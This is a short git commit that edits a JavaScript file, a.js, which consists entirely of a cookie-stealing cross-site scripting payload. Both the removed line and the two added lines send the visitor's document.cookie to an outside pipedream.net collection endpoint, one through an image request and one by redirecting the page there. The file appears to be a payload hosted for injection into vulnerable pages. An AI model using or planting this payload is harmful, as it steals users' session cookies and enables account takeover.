d8facf91da5ed1b2df2046182f7554155702d914
mahn-don <75029025+mahn-don@users.noreply.github.com>
2022-10-27 17:06:09 +0700

    Update a.js

--- a.js
+++ a.js
@@ -1,1 +1,2 @@
-var i=new Image;i.src="https://eoedryv3unavlt0.m.pipedream.net?"+document.cookie;
+new Image().src="https://eoedryv3unavlt0.m.pipedream.net/?c="+document.cookie;
+document.location='https://eoedryv3unavlt0.m.pipedream.net?c='+document.cookie;
